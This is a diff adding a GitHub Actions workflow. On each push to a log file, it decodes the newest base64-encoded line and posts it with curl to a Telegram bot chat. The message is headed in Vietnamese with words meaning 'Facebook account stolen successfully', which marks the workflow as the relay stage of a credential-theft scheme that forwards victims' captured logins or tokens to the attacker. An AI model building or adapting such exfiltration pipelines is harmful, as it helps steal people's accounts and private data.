@@ -1,1 +1,31 @@
+name: Notify Telegram with Decoded Log (Base64)
 
+on:
+  push:
+    paths:
+      - log_token.txt
+
+jobs:
+  notify:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Lấy và giải mã dòng log mới nhất
+        id: decode
+        run: |
+          last=$(tail -n 1 log_token.txt | tr -d '\r')
+          decoded=$(echo "$last" | base64 -d)
+          echo "log<<EOF" >> $GITHUB_OUTPUT
+          echo "$decoded" >> $GITHUB_OUTPUT
+          echo "EOF" >> $GITHUB_OUTPUT
+
+      - name: Send Telegram message
+        run: |
+          curl -s -X POST https://api.telegram.org/bot${{ secrets.BOT_TOKEN }}/sendMessage \
+            -d chat_id=${{ secrets.CHAT_ID }} \
+            --data-urlencode "text=ĐÁNH CẮP THÀNH CÔNG TK FACEBOOK<pre>${{ steps.decode.outputs.log }}</pre>" \
+            -d parse_mode=HTML
+            
